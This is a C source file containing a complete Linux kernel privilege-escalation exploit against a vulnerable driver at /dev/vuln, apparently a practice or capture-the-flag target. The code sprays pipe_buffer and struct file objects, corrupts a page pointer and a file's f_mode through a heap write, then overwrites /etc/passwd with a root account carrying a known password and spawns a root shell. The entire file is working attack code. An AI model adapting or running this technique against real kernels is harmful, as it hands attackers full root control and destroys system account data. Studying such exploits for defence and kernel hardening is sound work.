#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <assert.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>

#define CMD_ALLOC   0xf000
#define CMD_WRITE   0xf001

typedef struct {
    size_t size;
    char *data;
} request_t;

int fd;

void obj_alloc(void) {
    request_t req = {};
    assert(ioctl(fd, CMD_ALLOC, &req) == 0);
}

void obj_write(char *data, size_t size) {
    request_t req = {.size = size, .data = data};
    assert(ioctl(fd, CMD_WRITE, &req) == 0);
}

#define NUM_PIPE_SPRAY 0x20
#define NUM_SPRAY_FILE 0x20

int main() {
    fd = open("/dev/vuln", O_RDONLY);
    assert(fd != -1);

    puts("[*] Spraying struct pipe_buffer");
    int pipefds[NUM_PIPE_SPRAY][2];
    for (int i = 0; i < NUM_PIPE_SPRAY / 2; i++) {
        assert(pipe(pipefds[i]) != -1);
    }

    puts("[*] Allocating a victim object from kmalloc-1k");
    obj_alloc();

    puts("[*] Spraying struct pipe_buffer");
    for (int i = NUM_PIPE_SPRAY / 2; i < NUM_PIPE_SPRAY; i++) {
        assert(pipe(pipefds[i]) != -1);
    }

    puts("[*] Writing to pipes to allocate pages");
    for (int i = 0; i < NUM_PIPE_SPRAY; i++) {
        int val = 0xcafebabe + i;
        assert(write(pipefds[i][1], &val, sizeof(val)) != -1);
        assert(write(pipefds[i][1], "deadbeef", 8) != -1);
    }

    puts("[*] Overwitting pipe->bufs[0].page");
    char zero[0x400] = {};
    obj_write(zero, 0x400);

    puts("[*] Locating the victim pipe");
    int victim_pipefd = -1;
    int origin_pipefd = -1;
    for (int i = 0; i < NUM_PIPE_SPRAY; i++) {
        int val;

        assert(read(pipefds[i][0], &val, 4) != -1);
        if (val != 0xcafebabe + i) {
            victim_pipefd = i;
            origin_pipefd = val - 0xcafebabe;
            printf("[+] Found: victim_pipefd = %d, origin_pipefd = %d\n", victim_pipefd, origin_pipefd);
            break;
        }
    }
    if (victim_pipefd == -1) {
        puts("[-] Failed to locate the victim pipe");
        exit(0);
    }

    puts("[*] Closing the original pipe");
    assert(close(pipefds[origin_pipefd][0]) != -1);
    assert(close(pipefds[origin_pipefd][1]) != -1);

    puts("[*] Spraying struct file of /etc/passwd");
    int filefds[NUM_SPRAY_FILE];
    for (int i = 0; i < NUM_SPRAY_FILE; i++) {
        filefds[i]= open("/etc/passwd", O_RDONLY);
        assert(filefds[i] != -1);
    }

    puts("[*] Overwitting f_mode");
    int fake_f_mode = 0x84f801f;
    assert(write(pipefds[victim_pipefd][1], &fake_f_mode, 4) != -1);

    char payload[] = "root:$1$deadbeef$j9ep0CjBGivAnD5z6l5rr0:0:0:root:/root:/bin/sh\n";
    struct stat stat;
    assert(fstat(filefds[0], &stat) != -1);
    assert(sizeof(payload) < stat.st_size);
    char *buf = malloc(stat.st_size);
    strcpy(buf, payload);

    printf("[*] Overwriting /etc/passwd with %s", payload);
    for (int i = 0; i < NUM_SPRAY_FILE; i++) {
        if (write(filefds[i], buf, stat.st_size) != -1) {
            puts("[+] Success");
            puts("[+] You can now log in as root with the password: cafebabe");
            char *argv[] = {"/bin/sh", NULL};
            execve(argv[0], argv, NULL);
        }
    }
    puts("[-] Failed");
    while(1);
}